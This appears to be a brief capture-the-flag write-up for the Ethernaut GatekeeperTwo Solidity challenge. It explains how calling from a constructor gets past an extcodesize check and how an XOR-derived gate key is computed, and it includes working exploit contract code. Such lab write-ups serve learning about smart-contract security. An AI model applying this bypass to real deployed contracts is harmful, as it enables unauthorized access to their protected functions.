### Goals

Register as entrant

### Exploit

We need to call `enter()` with proper gateKey to pass the modifiers and set us as entrant.

### Code

Gate 1

We need to call it through smart contract to pass this check.

Gate2

Following assembly code checks if there is any storage occupied under caller address, which for smart contracts would evaluate to true. But we can bypass it if we call it enter in `constructor()` of our smart contract.

```
assembly {
    x := extcodesize(caller())
}
```

Gate 3

Since we need to compute the gateKey from msg.sender which we don't know until we deploy contract we would neet to do this inside constructor.

```code
contract Gate {
    constructor(address _target) {
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        _target.call(abi.encodeWithSignature("enter(bytes8)", gateKey));
    }
}
```

Deploy contract and pass GateKeeperTwo address.

Done!
